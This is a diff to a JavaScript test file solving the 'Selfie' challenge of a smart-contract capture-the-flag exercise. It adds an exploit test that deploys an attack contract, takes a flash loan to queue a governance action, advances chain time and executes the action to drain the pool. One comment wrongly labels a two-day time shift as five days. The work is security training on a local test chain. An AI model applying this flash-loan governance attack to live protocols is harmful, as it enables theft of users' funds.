@@ -10,7 +10,7 @@ describe('[Challenge] Selfie', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
-
+        
         const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
         const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
         const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
@@ -27,10 +27,29 @@ describe('[Challenge] Selfie', function () {
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.equal(TOKENS_IN_POOL);
+
+        console.log("Deployer : ", deployer.address)
+        console.log("Attacker : ", attacker.address)
+        console.log("Token : ", this.token.address)
+        console.log("Governance : ", this.governance.address)
+        console.log("pool : ", this.pool.address)
+        console.log("")
+        
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackSelfiePoolFactory = await ethers.getContractFactory('AttackSelfiePool', attacker);
+        attackSelfie = await AttackSelfiePoolFactory.deploy(this.token.address, this.pool.address, this.governance.address);
+
+        console.log("AttackSelfie : ", attackSelfie.address)
+        console.log("")
+        let id = await attackSelfie.callStatic.attack(TOKENS_IN_POOL)
+        console.log(id)
+        let tx = await attackSelfie.connect(attacker).attack(TOKENS_IN_POOL)
+        console.log("")
+        await ethers.provider.send("evm_increaseTime", [(2 * 24 * 60 * 60)]); // 5 days
+        await this.governance.connect(attacker).executeAction(id)
     });
 
     after(async function () {
